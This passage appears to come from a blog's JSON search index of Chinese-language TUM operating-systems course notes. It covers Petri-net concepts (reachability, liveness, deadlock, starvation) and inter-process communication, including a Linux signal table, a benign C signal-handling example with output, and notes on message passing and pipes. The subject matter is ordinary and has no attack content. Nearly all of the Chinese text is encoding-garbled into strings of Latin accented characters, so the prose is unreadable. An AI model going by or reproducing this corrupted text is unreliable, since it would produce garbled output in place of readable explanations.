æ˜æ˜¾ä¸æ˜¯ï¼Œå› ä¸º $t_3$ åªæœ‰åœ¨ $t_1, t_2$ è¢«è§¦å‘åæ‰èƒ½è¢«è§¦å‘ã€‚ ä¸ç¡®å®šæ€§ï¼ˆNichtdeterminismusï¼‰ä¸ç¡®å®šæ€§è¡¨ç¤ºåœ¨ç»™å®šçš„æ ‡è®°çŠ¶æ€ $M$ ä¸‹ï¼Œå¯èƒ½ä¼šå‡ºç°å…³äºTransitionenå¯è§¦å‘æ€§çš„å†²çªã€‚ è€Œ $t_0$ å’Œ $t_1$ å¤„äºå†²çªä¸­ï¼ˆstehen im Konfliktï¼‰ï¼Œå½“å®ƒä»¬å…±äº«è¾“å…¥æˆ–è¾“å‡ºçš„ä½ç½®ï¼Œå¹¶ä¸”è¿™äº›ä½ç½®çš„ token æ•°é‡åªèƒ½æ»¡è¶³å…¶ä¸­ä¸€ä¸ªTransitionçš„è§¦å‘æ¡ä»¶ã€‚ å¦‚æœtokençš„æ•°é‡è¶³å¤Ÿè§¦å‘æ‰€æœ‰çš„Transitionené‚£å°±ä¸ç®—æœ‰å†²çªï¼Œæ•´ä¸ªå›¾ä¹Ÿæ˜¯ç¡®å®šçš„ï¼ˆdeterministischï¼‰ã€‚ è¿™æ ·ä¼šå¯¼è‡´è¿›è¡Œä¸€æ¬¡ä¸ç¡®å®šçš„é€‰æ‹©ï¼ˆnichtdeterministische Auswahlï¼‰ã€‚ ä¾‹å­ï¼š è¿™é‡Œçš„ $t_1$ å’Œ $t_3$ å†²çªäº†ï¼Œå› ä¸ºs1é‡Œåªæœ‰1ä¸ªtokenï¼Œæ‰€ä»¥è¦ä¹ˆè§¦å‘ $t_1$ ï¼Œè¦ä¹ˆè§¦å‘ $t_3$ã€‚ å¯åˆ°è¾¾æ€§ï¼ˆErreichbarkeitï¼‰ç»™å®šä¸€ä¸ªä¸€ä¸ªPetri-Netz (S, T, F) ï¼Œcï¼Œwï¼Œä»¥åŠä¸€ä¸ªåˆå§‹çŠ¶æ€ $M_0$ ã€‚ é‚£ä¹ˆä¸€ä¸ªæœ‰é™åºåˆ—ï¼ˆendliche Sequenzï¼‰$\\rho = t_0, t_1,â€¦, t_n \\ (\\text{with } t_i \\in T)$ è¢«å«åšç”± $M_0$ æ¿€æ´»çš„æœ‰é™åˆ‡æ¢åºåˆ—ï¼ˆvon M aktivierteendliche Schaltfolgeï¼‰ï¼Œå½“å­˜åœ¨ $M_1, M_2,â€¦ M_n$ ä½¿å¾—ï¼š M_0 \\xrightarrow{t_0} M_1 \\xrightarrow{t_1} \\dots \\xrightarrow{t_n} M_n, \\text{ å³ } M_0 \\xrightarrow{\\rho} M_nå¦‚æœå­˜åœ¨ä¸€ä¸ªæœ‰é™åºåˆ—ä½¿å¾— $M$ èƒ½å˜æˆ $Mâ€™$ ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¯´ $Mâ€™$ ist von $M$ erreichbarã€‚ é’ˆå¯¹è¿™ä¸ªErreichbarkeitæˆ‘ä»¬å¯ä»¥å†å»ºç«‹ä¸ªå›¾ï¼Œå«åš Erreichbarkeitsgraphã€‚é‡Œé¢çš„ç‚¹è¡¨ç¤º Belegungï¼Œæœ‰å‘è¾¹è¡¨ç¤º Transitionã€‚ ä¾‹å­ï¼š å®ƒå¯¹åº”çš„Erreichbarkeitsgraphï¼š è®°å¾—å·¦ä¸Šè§’çš„è¿™ä¸ªæœ‰å‘è¾¹ä¸€å®šè¦ç”»ï¼ æ³¨æ„ï¼šæ¯ä¸ªPetri-Netzä¼šæœ‰ç€å”¯ä¸€çš„ä¸€ä¸ªErreichbarkeitsgraphï¼Œä½†ä¸€ä¸ªErreichbarkeitsgraphå¯èƒ½ä¼šå¯¹åº”å¾ˆå¤šä¸ªPetri-Netzï¼Œå› ä¸ºå¯èƒ½å­˜åœ¨ä¸€äº›æ°¸è¿œæ— æ³•è§¦å‘çš„Transitionenï¼ˆè¿™äº›æ— æ³•è§¦å‘çš„Transitionenå®Œå…¨ä¸ä¼šæ”¹å˜Erreichbarkeitsgraphï¼‰ã€‚ Lebendigkeitï¼ˆlivenessï¼‰ç»™å®šä¸€ä¸ªä¸€ä¸ªPetri-Netz (S, T, F) ï¼Œcï¼Œwï¼Œä»¥åŠä¸€ä¸ªåˆå§‹çŠ¶æ€ $M_0$ ã€‚ å®ƒæ˜¯æ´»è·ƒçš„ï¼ˆlebendigï¼‰ï¼Œå½“å¯¹äºæ‰€æœ‰ $t \\in T$ éƒ½æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š å¯¹äºæ‰€æœ‰ä» $M_0$ å¯åˆ°è¾¾çš„çŠ¶æ€ $M_1$ï¼Œå­˜åœ¨ä¸€ä¸ªåç»­çŠ¶æ€ $M_2$ï¼Œ ä½¿å¾— $t$ åœ¨ $M_2$ ä¸­å¯ä»¥è§¦å‘ï¼Œä¸” $M_2$ æ˜¯ä» $M_1$ å¯è¾¾çš„ï¼Œå³ \\forall M_1 \\text{ with } M_0 \\xrightarrow{\\rho_1} M_1: \\quad \\exists \\rho_2, M_2 \\text{ s.t. } M_1 \\xrightarrow{\\rho_2} M_2 \\xrightarrow{t}æ­»é”ï¼ˆVerklemmung, Deadlockï¼‰ç»™å®šä¸€ä¸ªä¸€ä¸ªPetri-Netz (S, T, F) ï¼Œcï¼Œwï¼Œä»¥åŠä¸€ä¸ªåˆå§‹çŠ¶æ€ $M_0$ ã€‚ ä» $M_0$ å‡ºå‘å¯è¾¾çš„æŸä¸ªæ ‡è®° $M$ï¼Œç§°ä¸ºå®Œå…¨æ­»é”çŠ¶æ€ï¼ˆvollstÃ¤ndige Verklemmungï¼‰ï¼Œå¦‚æœåœ¨è¯¥çŠ¶æ€ä¸‹æ²¡æœ‰ä»»ä½•Transition $t \\in T$ å¯ä»¥è§¦å‘ã€‚ å¦‚æœä¸€ä¸ªNetzæ˜¯lebendigçš„ï¼Œé‚£ä¹ˆå®ƒä¸€å®šæ˜¯verklemmungsfreiã€‚ï¼ˆlebendig $\\Rightarrow$ verklemmungsfreiï¼‰ ä½†ä¸€ä¸ªNetzæ˜¯verklemmungsfreiä¸ä¸€å®šèƒ½å¤Ÿè¯´æ˜å®ƒä¹Ÿæ˜¯lebendigçš„ã€‚ï¼ˆverklemmungsfrei $\\nRightarrow$ lebendig ï¼‰ Verhungernï¼ˆStarvationï¼‰ï¼ŒFarinessç»™å®šä¸€ä¸ªä¸€ä¸ªPetri-Netz (S, T, F) ï¼Œcï¼Œwï¼Œä»¥åŠä¸€ä¸ªåˆå§‹çŠ¶æ€ $M_0$ ã€‚ Eine Transaktion t âˆˆ T verhungert, å½“å­˜åœ¨ä¸€ä¸ªæ— çº¿åºåˆ—ä½¿å¾—tå°½ç®¡å¤„äºå¯è§¦å‘çš„çŠ¶æ€ä½†æ˜¯åªè¢«è§¦å‘äº†æœ‰é™æ¬¡ã€‚ï¼ˆwenn es eine unendliche Sequenz gibt, in der t trotz Transitionsbereitschaft nur endlich oft auftritt.ï¼‰ æ³¨æ„è¿™é‡Œçš„å‰ææ¡ä»¶â€œå¤„äºå¯è§¦å‘çš„çŠ¶æ€â€éå¸¸é‡è¦ï¼Œè¿™ä¸ªå¦‚æœä¸æ»¡è¶³é‚£ä¹ˆå°±ä¸èƒ½å«verhungertã€‚ ä¸€ä¸ªNetzæ˜¯å…¬å¹³çš„ï¼ˆfairï¼‰çš„ï¼Œå½“ä¸å­˜åœ¨æŸä¸ªæ— é™åºåˆ—ï¼ˆä¾‹å¦‚ $t_0 \\to t_4 \\to t_1 \\to \\dots$ï¼‰ï¼Œä½¿å¾—å˜è¿ $t$ è™½ç„¶å§‹ç»ˆå¤„äºå¯è§¦å‘çŠ¶æ€ï¼Œå´æ°¸è¿œæ²¡æœ‰æˆ–åªæœ‰æœ‰é™æ¬¡è¢«å®é™…è§¦å‘ã€‚ æ‰€ä»¥å¦‚æœä¸€ä¸ªNetzæ˜¯å…¬å¹³çš„ï¼Œé‚£ä¹ˆå°±æ²¡æœ‰Transitionä¼šæŒ¨é¥¿ï¼ˆverhungertï¼‰ã€‚ ä¾‹å­ï¼š è¿™ä¸ªNetzæ˜¯ä¸å…¬å¹³çš„ï¼ˆunfairï¼‰ï¼Œå› ä¸ºå­˜åœ¨ $t_0 \\to t_0 \\to t_0 \\to \\dots$ ï¼Œå³ $t_1$ ä¼šæŒ¨é¥¿ï¼› $t_1 \\to t_1 \\to t_1 \\to \\dots$ ï¼Œå³ $t_0$ ä¼šæŒ¨é¥¿ï¼› ä¾‹å­ï¼š è¿™ä¸ªå›¾æ˜¯ï¼š nicht lebendig å› ä¸ºt0åªèƒ½è¢«è§¦å‘ä¸€æ¬¡ã€‚ deadlockfrei è¿›åˆ°å³è¾¹é‚£ä¸ªåœˆé‡Œä¹‹åæ°¸è¿œéƒ½å¯ä»¥æœ‰åç»­æ“ä½œã€‚ fair å› ä¸ºt0è§¦å‘ä¸€æ¬¡ä¹‹åä¸å¯èƒ½å†è¿›å…¥å‡†å¤‡å°±ç»ªçš„çŠ¶æ€ï¼Œæ‰€ä»¥ä¸ç®—æŒ¨é¥¿ã€‚","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS æ“ä½œç³»ç»Ÿ","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/GBS-æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"Petri-Netz","slug":"Petri-Netz","permalink":"https://archer-baiyi.github.io/tags/Petri-Netz/"}]},{"title":"GBS 5 Inter-Prozesskommunikation (IPC) è¿›ç¨‹é—´é€šä¿¡","slug":"TUM info ç¬”è®°/GBS/GBS-5-Inter-Prozesskommunikation-IPC-è¿›ç¨‹é—´é€šä¿¡","date":"2025-04-03T21:19:45.000Z","updated":"2025-04-26T18:31:01.019Z","comments":true,"path":"2025/04/03/TUM info ç¬”è®°/GBS/GBS-5-Inter-Prozesskommunikation-IPC-è¿›ç¨‹é—´é€šä¿¡/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-5-Inter-Prozesskommunikation-IPC-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/","excerpt":"æ“ä½œç³»ç»ŸåŸºç¡€ç›¸å…³ç¬”è®°","text":"[toc] æ— è¿æ¥é€šä¿¡ï¼ˆVerbindungslose Kommunikationï¼‰æ— è¿æ¥é€šä¿¡ï¼ˆVerbindungslose Kommunikationï¼‰çš„é€šé“ï¼ˆKanÃ¤leï¼‰å¯ä»¥æŒ‰ç…§å¸¦å®½ï¼ˆBandbreiteï¼‰åˆ†æˆ2ç§ï¼š çª„å¸¦é€šé“ï¼ˆSchmalbandige KanÃ¤leï¼‰ å®½å¸¦é€šé“ï¼ˆBreitbandige KanÃ¤leï¼‰ çª„å¸¦é€šé“ï¼ˆSchmalbandige KanÃ¤leï¼‰çª„å¸¦é€šé“ï¼ˆSchmalbandige KanÃ¤leï¼‰åªä¼ è¾“å°‘é‡ä¿¡æ¯ï¼ˆwenige Bitsï¼‰ï¼Œä¸»è¦ç”¨äºäº‹ä»¶çš„é€šçŸ¥ï¼ˆMelden von Ereignissenï¼‰ã€‚å®ƒéœ€è¦åŒæ­¥æœºåˆ¶å’Œä¸­æ–­æœºåˆ¶ï¼ˆSynchronisationskonzepte und Unterbrechungskonzepte ï¼‰æ¥ç¡®ä¿é€šä¿¡çš„å¯é æ€§ã€‚ Linuxé‡Œçš„ä¾‹å­ï¼šSignals è¿›ç¨‹å¯ä»¥äº’ç›¸å‘é€ä¿¡å·ï¼ˆä½¿ç”¨ kill() ï¼‰ è¿›ç¨‹å¯ä»¥æ˜¾å¼æ•è·è¿™äº›ä¿¡å·ï¼ˆä½¿ç”¨ signal() ï¼‰ï¼š å¯ä»¥é€šè¿‡æ³¨å†Œä¸€ä¸ªä¿¡å·å¤„ç†å‡½æ•°ï¼ˆsignal handlerï¼‰æ¥å¤„ç†ä¿¡å· ä¹Ÿå¿½ç•¥è¯¥ä¿¡å·ï¼ˆä½¿ç”¨ SIG_IGNï¼‰ å¦‚æœä¸€ä¸ªè¿›ç¨‹æ²¡æœ‰æ•è·ï¼ˆabfangenï¼‰ä¿¡å·ï¼Œé‚£ä¹ˆæ“ä½œç³»ç»Ÿä¼šç»ˆæ­¢ï¼ˆbeendetï¼‰è¯¥è¿›ç¨‹ã€‚ SIGKILL å’Œ SIGSTOP æ˜¯ä¸èƒ½è¢«æ•è·çš„ï¼Œè¿™äº›ä¿¡å·ä¼šå¼ºåˆ¶ç»ˆæ­¢æˆ–æš‚åœè¿›ç¨‹ï¼Œè¿›ç¨‹æ— æ³•é˜»æ­¢æˆ–å¿½ç•¥å®ƒä»¬ kill()å‡½æ•°çš„ç”¨æ³•ï¼š kill(pid, signal)ï¼Œå…¶ä¸­pidæ˜¯è¿›ç¨‹IDï¼Œsignalæ˜¯å…·ä½“è¦å‘é€çš„ä¿¡å·ï¼Œå¯é€‰çš„æœ‰ï¼š ä¿¡å·å ä½œç”¨è¯´æ˜ SIGHUP ç»ˆç«¯æŒ‚èµ·æˆ–æ§åˆ¶è¿›ç¨‹ç»ˆæ­¢ï¼Œå¸¸ç”¨äºé‡æ–°åŠ è½½é…ç½® SIGINT ä¸­æ–­ï¼ˆé€šå¸¸æ¥è‡ª Ctrl+Cï¼‰ SIGILL éæ³•æŒ‡ä»¤ï¼Œé€šå¸¸æ˜¯ç¨‹åºé”™è¯¯å¯¼è‡´ SIGABRT å¼‚å¸¸ç»ˆæ­¢ï¼ˆç”± abort() è§¦å‘ï¼‰ SIGKILL å¼ºåˆ¶ç»ˆæ­¢ï¼Œæ— æ³•è¢«æ•è·æˆ–å¿½ç•¥ SIGUSR1 ç”¨æˆ·è‡ªå®šä¹‰ä¿¡å· 1 SIGSEGV æ®µé”™è¯¯ï¼ˆSegmentation Faultï¼‰ SIGUSR2 ç”¨æˆ·è‡ªå®šä¹‰ä¿¡å· 2 SIGPIPE ç®¡é“ç ´è£‚ï¼ˆå†™å…¥æ²¡æœ‰è¯»å–ç«¯çš„ pipeï¼‰ SIGALRM å®šæ—¶å™¨ä¿¡å·ï¼ˆalarm() åˆ°æœŸè§¦å‘ï¼‰ SIGTERM æ­£å¸¸ç»ˆæ­¢è¯·æ±‚ï¼Œé»˜è®¤çš„ kill ä¿¡å· SIGCHLD å­è¿›ç¨‹ç»“æŸæ—¶é€šçŸ¥çˆ¶è¿›ç¨‹ SIGCONT æ¢å¤è¢«åœæ­¢çš„è¿›ç¨‹ SIGSTOP å¼ºåˆ¶åœæ­¢ï¼Œæ— æ³•è¢«æ•è·æˆ–å¿½ç•¥ SIGTSTP ç»ˆç«¯åœæ­¢ä¿¡å·ï¼ˆCtrl+Zï¼‰ ä»£ç ç¤ºä¾‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;// ä¿¡å·å¤„ç†å‡½æ•°ï¼šå½“æ¥æ”¶åˆ°ä¿¡å·æ—¶æ‰§è¡Œvoid sighandler(int sig) &#123; printf(&quot;Caught signal %d\\n&quot;, sig); // é‡æ–°æ³¨å†Œä¿¡å·å¤„ç†å™¨ï¼ˆæ—§ç‰ˆ signal API éœ€è¦è¿™æ ·åšï¼‰ signal(SIGINT, sighandler); // Ctrl+C signal(SIGALRM, sighandler); // alarm() è§¦å‘çš„å®šæ—¶å™¨ä¿¡å·&#125;int main(int argc, char *argv[], char *envp[]) &#123; char buffer[1024]; // ç”¨äºå­˜å‚¨ç”¨æˆ·è¾“å…¥ int len; // æ³¨å†Œä¿¡å·å¤„ç†å‡½æ•° signal(SIGINT, sighandler); // æ•è· Ctrl+C signal(SIGALRM, sighandler); // æ•è·å®šæ—¶å™¨ alarm ä¿¡å· // è®¾ç½®ä¸€ä¸ªå®šæ—¶å™¨ï¼Œ5 ç§’åå‘é€ SIGALRM ä¿¡å· alarm(5); // ç¬¬ä¸€é˜¶æ®µï¼šæ¯ç§’æ‰“å°ä¸€æ¬¡è®¡æ•°ï¼ŒæŒç»­ 10 ç§’ for (len = 0; len &lt; 10; len++) &#123; printf(&quot;Counting %d...\\n&quot;, len); sleep(1); // æ¯ç§’æš‚åœ &#125; // ç¬¬äºŒæ¬¡å®šæ—¶å™¨è®¾ç½®ï¼Œåœ¨ 10 ç§’åå‘é€å¦ä¸€ä¸ª SIGALRM alarm(10); // ç¬¬äºŒé˜¶æ®µï¼šè¿›å…¥ä¸€ä¸ªå¾ªç¯ï¼Œä»æ ‡å‡†è¾“å…¥è¯»å–ç”¨æˆ·è¾“å…¥ while (1) &#123; // ä»æ ‡å‡†è¾“å…¥è¯»å–å†…å®¹ï¼ˆé˜»å¡å¼ï¼‰ len = read(0, buffer, sizeof(buffer) - 1); if (len == -1) &#123; // è¯»å–å¤±è´¥ï¼Œæ‰“å°é”™è¯¯å¹¶ç»§ç»­ perror(&quot;read() failed&quot;); continue; &#125; if (len == 0) &#123; // è¯»åˆ° EOFï¼ˆæ¯”å¦‚è¾“å…¥ Ctrl+Dï¼‰ï¼Œé€€å‡ºç¨‹åº printf(&quot;Exiting\\n&quot;); exit(0); &#125; buffer[len] = &#x27;\\0&#x27;; // æ·»åŠ å­—ç¬¦ä¸²ç»“å°¾ç¬¦ // å¦‚æœç”¨æˆ·è¾“å…¥çš„æ˜¯ &quot;exit&quot;ï¼Œé€€å‡ºç¨‹åº if (!strncmp(buffer, &quot;exit&quot;, 4)) &#123; exit(0); &#125; // æŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹åŸæ ·è¾“å‡ºå›ç»ˆç«¯ write(1, buffer, strlen(buffer)); &#125; return 0;&#125; è¾“å‡ºç¤ºä¾‹ï¼š 12345678910111213Counting 0...Counting 1......Counting 4...Caught signal 14 &lt;-- alarm(5) åˆ°æ—¶è§¦å‘ SIGALRMCounting 5......Counting 9...hello, world &lt;-- ç”¨æˆ·è¾“å…¥hello, world &lt;-- ç¨‹åºå›æ˜¾Caught signal 14 &lt;-- alarm(10) åˆè§¦å‘äº† SIGALRM^C Caught signal 2 &lt;-- ç”¨æˆ·æŒ‰äº† Ctrl+Cï¼Œè§¦å‘ SIGINT (signal 2)exit &lt;-- ç”¨æˆ·è¾“å…¥ exitï¼Œè§¦å‘é€€å‡º å®½å¸¦é€šé“ï¼ˆBreitbandige KanÃ¤leï¼‰ å®½å¸¦é€šé“ï¼ˆBreitbandige KanÃ¤leï¼‰ç”¨äºä¼ è¾“å¤§é‡æ•°æ®ï¼Œå¯ä»¥æ ¹æ®é€šä¿¡çš„æ–¹å¼è¿›ä¸€æ­¥åˆ’åˆ†ä¸ºï¼š éšå¼é€šä¿¡ï¼ˆImplizite Kommunikationï¼‰ æ˜¾å¼é€šä¿¡ï¼ˆExplizite Kommunikationï¼‰ éšå¼é€šä¿¡ï¼ˆImplizite Kommunikationï¼‰éšå¼é€šä¿¡ï¼ˆImplizite Kommunikationï¼‰æ˜¯é€šè¿‡å…±äº«èµ„æºå®ç°çš„ï¼Œæ¯”å¦‚è¯´å†…å­˜ã€å¯„å­˜å™¨ã€æ–‡ä»¶ã€ç¯å½¢ç¼“å†²åŒºç­‰ã€‚ ä¼˜ç‚¹ï¼šç®€å•å¿«é€Ÿï¼Œå› ä¸ºä¸éœ€è¦ä¸éœ€è¦åœ¨ä¸åŒåœ°å€ç©ºé—´ï¼ˆAdressrÃ¤umenï¼‰ä¹‹é—´å¤åˆ¶æ•°æ®ã€‚ ç¼ºç‚¹ï¼šä¸ä¸€å®šä¸€ç›´éƒ½æœ‰å…±äº«åŒºåŸŸå¯ä»¥ç”¨ï¼›å¯èƒ½ä¼šå‡ºç° busy-waitingï¼Œæ‰€ä»¥éœ€è¦é¢å¤–çš„åŒæ­¥æœºåˆ¶ã€‚ ï¼ˆç¬¬ä¸‰ç« çš„å†…å®¹å°±æ˜¯åœ¨è®²è¿™ä¸ªï¼‰ è€Œéšå¼é€šä¿¡ï¼ˆImplizite Kommunikationï¼‰ å¯ä»¥è¿›ä¸€æ­¥åˆ’åˆ†ä¸ºï¼š åŒæ­¥é€šä¿¡ï¼ˆSynchrone Kommunikationï¼‰ å‘é€æ–¹æˆ–æ¥æ”¶æ–¹å¯èƒ½éœ€è¦ç­‰å¾…å¯¹æ–¹ã€‚ æ¯”å¦‚è¯´å…±äº«å†…å­˜å¹¶ä¸”è®¾ç½®äº†åŒæ­¥æœºåˆ¶ã€‚ å¼‚æ­¥é€šä¿¡ï¼ˆAsynchrone Kommunikationï¼‰ å‘é€å’Œæ¥æ”¶å¯ä»¥ç‹¬ç«‹è¿›è¡Œã€‚ æ¯”å¦‚è¯´é€šè¿‡å…±äº«çš„æ–‡ä»¶è¿›è¡Œkommunizierenã€‚ æ˜¾å¼é€šä¿¡ï¼ˆExplizite Kommunikationï¼‰æ˜¾å¼é€šä¿¡ï¼ˆExplizite Kommunikationï¼‰åˆ™æ˜¯æˆ‘ä»¬æ¯”è¾ƒç†Ÿæ‚‰çš„ï¼šå‘é€/æ¥æ”¶ä¿¡æ¯ã€‚é€‚ç”¨äºåœ°å€ç©ºé—´ï¼ˆAdressrÃ¤umenï¼‰åˆ†ç¦»çš„è¿›ç¨‹ï¼ˆæ¯”å¦‚ä¸¤ä¸ªäº’ä¸ç›¸å¹²çš„è¿›ç¨‹ï¼‰ï¼Œä¸è¿‡æ˜¯ä¸æ“ä½œç³»ç»Ÿçš„ç›´æ¥äº¤äº’ã€‚ è¿™ç§é€šä¿¡å¯ä»¥æ˜¯æœ¬åœ°çš„ä¹Ÿå¯ä»¥æ˜¯è¿œç¨‹çš„ã€‚ ä¸€èˆ¬ä¿¡æ¯ç”±2éƒ¨åˆ†ç»„æˆï¼š æ¶ˆæ¯å¤´ï¼ˆNachrichtenkopfï¼Œheaderï¼‰ï¼šåŒ…å«ç®¡ç†ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´å‘é€è€…ã€æ¥æ”¶è€…çš„æ ‡è¯†ã€æ¶ˆæ¯å¤§å°ç­‰ã€‚ æ¶ˆæ¯ä½“ï¼ˆNachrichtenkÃ¶rperï¼‰ï¼šæœ‰æ•ˆè½½è·ï¼ˆpayloadï¼‰ï¼Œä¹Ÿå°±æ˜¯çœŸæ­£çš„ä¿¡æ¯å†…å®¹ã€‚ æµç¨‹ï¼š è¿›ç¨‹ä½¿ç”¨ send() å‘é€æ¶ˆæ¯ æ“ä½œç³»ç»Ÿçš„æ¶ˆæ¯æœåŠ¡è´Ÿè´£ä¼ é€’è¯¥æ¶ˆæ¯ æ¥æ”¶æ–¹è¿›ç¨‹ä½¿ç”¨ recv() æ¥æ”¶è¯¥æ¶ˆæ¯ è€Œæ˜¾å¼é€šä¿¡ï¼ˆExplizite Kommunikationï¼‰ åŒæ ·å¯ä»¥è¿›ä¸€æ­¥åˆ’åˆ†ä¸ºï¼š åŒæ­¥é€šä¿¡ï¼ˆSynchrone Kommunikationï¼‰ å‘é€æ–¹æˆ–æ¥æ”¶æ–¹å¯èƒ½éœ€è¦ç­‰å¾…å¯¹æ–¹ å¼‚æ­¥é€šä¿¡ï¼ˆAsynchrone Kommunikationï¼‰ å‘é€å’Œæ¥æ”¶å¯ä»¥ç‹¬ç«‹è¿›è¡Œ è¿™å…¶ä¸­åˆæœ‰2ç§æ¶ˆæ¯é€šä¿¡çš„æ¨¡å¼ï¼ˆMusterï¼‰ï¼š æ¶ˆæ¯é€šçŸ¥ï¼ˆMeldungï¼‰ æ˜¯å•å‘çš„ï¼ˆunidirectionalï¼‰ï¼Œé€šå¸¸åªæ˜¯ä¼ é€’å°‘é‡æ•°æ®ï¼Œæ¯”å¦‚è¯´é€šçŸ¥çŠ¶æ€å˜åŒ–ã€‚ ä»»åŠ¡ï¼ˆAuftragï¼‰ æ˜¯åŒå‘çš„ï¼ˆbidirectionalï¼‰ï¼Œæ¯”å¦‚è¯´æŸ¥è¯¢æŸäº›æ•°æ®ï¼Œè¯·æ±‚å‘é€åæ”¶åˆ°åŒ…å«æ•°æ®çš„å“åº”ã€‚ Asynchronçš„ä¼˜ç‚¹ï¼š åœ¨å®æ—¶ç³»ç»Ÿä¸­éå¸¸æœ‰ç”¨ï¼Œå½“å‘é€è¿›ç¨‹ä¸èƒ½è¢«é˜»å¡æ—¶ï¼› å…è®¸å‘é€æ–¹å’Œæ¥æ”¶æ–¹å¹¶è¡Œå¤„ç†ä»»åŠ¡ï¼› é€‚åˆç”¨äºäº‹ä»¶çš„é€šçŸ¥/ä¿¡å·ä¼ é€’ã€‚ Asynchronçš„ç¼ºç‚¹ï¼š æ“ä½œç³»ç»Ÿæœ‰ç®¡ç†è´Ÿæ‹…ï¼ˆéœ€è¦æ¶ˆæ¯ç¼“å†²åŒºæ¥å­˜å‚¨å¼‚æ­¥æ•°æ®ï¼‰ é”™è¯¯å¤„ç†æ›´å¤æ‚ï¼š æ— æ³•ç›´æ¥é€šçŸ¥å‘é€æ–¹æ˜¯å¦æˆåŠŸï¼› æ•°æ®åŒ…å¯èƒ½ä¸¢å¤±ï¼ˆå½“ç¼“å†²åŒºæ»¡äº†ï¼Œå°¤å…¶æ˜¯ç½‘ç»œé€šä¿¡ä¸­ï¼‰ï¼› æœ‰æ—¶éœ€è¦é‡ä¼ æ•°æ®åŒ…ã€‚ åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¼‚æ­¥é€šä¿¡æ›´å¸¸ç”¨ï¼Œç‰¹åˆ«é€‚ç”¨äºä¸ç¡®å®šæ¥æ”¶æ–¹æ˜¯å¦åœ¨çº¿ã€æˆ–è€…æ— æ³•é¢„æµ‹å“åº”æ—¶é—´çš„æƒ…å†µã€‚ å¯ä»¥ä½¿ç”¨çº¿ç¨‹æ¥ç»“åˆåŒæ­¥ä¸å¼‚æ­¥é€šä¿¡ï¼ˆæ¯”å¦‚ï¼šä¸»çº¿ç¨‹åŒæ­¥å¤„ç†ã€å­çº¿ç¨‹å¼‚æ­¥ç­‰å¾…ï¼‰ã€‚ Asynchrone Meldungï¼š åªå‘ä¸ç­‰ Synchrone Meldungï¼š ç­‰å¾…å¯¹æ–¹ç¡®è®¤æ”¶åˆ° æµç¨‹ï¼š æ¥æ”¶æ–¹åœ¨æ”¶åˆ°æ¶ˆæ¯åä¼šå‘é€ä¸€ä¸ªç¡®è®¤ï¼ˆBestÃ¤tigungï¼‰ å‘é€æ–¹åœ¨å‘é€å®Œæ¶ˆæ¯åä¼šç­‰å¾…æ¥æ”¶ç¡®è®¤ï¼ˆEmpfangsbestÃ¤tigungï¼‰ ç¡®è®¤æ¶ˆæ¯ä¸åŒ…å«å®é™…æ•°æ®ï¼Œä»…ç”¨äºåŒæ­¥ã€‚ å¦ä¸€ç§æ–¹æ³•ï¼šRendezvous-Verfahrenï¼š åœ¨äº¤æ¢æ¶ˆæ¯ä¹‹å‰ï¼Œå‘é€æ–¹ä¸æ¥æ”¶æ–¹éƒ½è¦äº‹å…ˆå‡†å¤‡å¥½è¿›è¡Œå‘é€å’Œæ¥æ”¶ è¿™æ ·ä¸€æ¥æ¶ˆæ¯ä¸éœ€è¦ç¼“å†² Asynchrone Auftragï¼š å„å‘å„çš„ ä»»åŠ¡ï¼ˆAuftragï¼‰å’Œç»“æœï¼ˆResultatï¼‰æ˜¯ä½œä¸ºä¸¤ä¸ªç‹¬ç«‹çš„æ¶ˆæ¯å‘é€çš„ã€‚ Synchrone Auftragï¼š ç­‰å¾…å¯¹æ–¹å›å¤ Streamsæµï¼ˆStreamï¼‰æ˜¯å¯¹è¿æ¥ï¼ˆVerbindungï¼‰çš„ä¸€ç§æŠ½è±¡ã€‚ æ¶ˆæ¯åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«ç¼“å†²ï¼Œæ‰€æœ‰æ¶ˆæ¯è¢«æ•´åˆä¸ºé€»è¾‘ä¸Šçš„å­—èŠ‚æµï¼ˆbyte streamï¼‰ã€‚ æ“ä½œç³»ç»Ÿå¯ä»¥å»ºç«‹/å…³é—­è¿æ¥ï¼Œæˆ–è€…æ˜¯åœ¨æµä¸­è¿›è¡Œè¯»/å†™æ“ä½œã€‚ C++å¤´æ–‡ä»¶ä¸­çš„ 1#include &lt;iostream&gt; æŒ‡çš„å°±æ˜¯è¿™ä¸ªã€‚ è€Œç®¡é“ï¼ˆPipesï¼‰æ­£æ˜¯æµï¼ˆStreamï¼‰çš„å®ç°ã€‚ ç®¡é“æ˜¯ä¸€ä¸ªå•å‘çš„æµï¼ˆunidirektionaler Stromï¼‰ã€‚åŒå‘é€šä¿¡å¯ä»¥ç”¨ä¸¤ä¸ªç®¡é“æ¥æ¨¡æ‹Ÿã€‚ç®¡é“å®ç°å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰ çš„æ•°æ®ä¼ è¾“æ¨¡å‹ã€‚ ç®¡é“ï¼ˆPipesï¼‰ä¸€èˆ¬åˆ†ä¸º2ç§ï¼š 